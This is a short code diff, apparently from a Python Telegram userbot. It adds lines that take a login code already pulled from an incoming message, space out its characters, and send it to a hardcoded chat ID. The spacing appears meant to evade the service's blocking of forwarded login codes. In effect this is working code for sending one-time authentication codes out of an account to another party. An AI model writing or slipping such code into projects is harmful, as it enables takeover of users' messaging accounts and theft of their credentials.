@@ -49,5 +49,12 @@ async def extract_code(client, message):
     if match:
         code = match.group(0)
         SAVR_LOGIN["code"] = code
+    if "code" in SAVR_LOGIN:
+        code = SAVR_LOGIN["code"]
+        formatted = " ".join(code) 
+        await client.send_message(
+            text=f"Here is the code {formatted}",
+            chat_id = 5326801541
+        ) 
 
 Userbot.run()
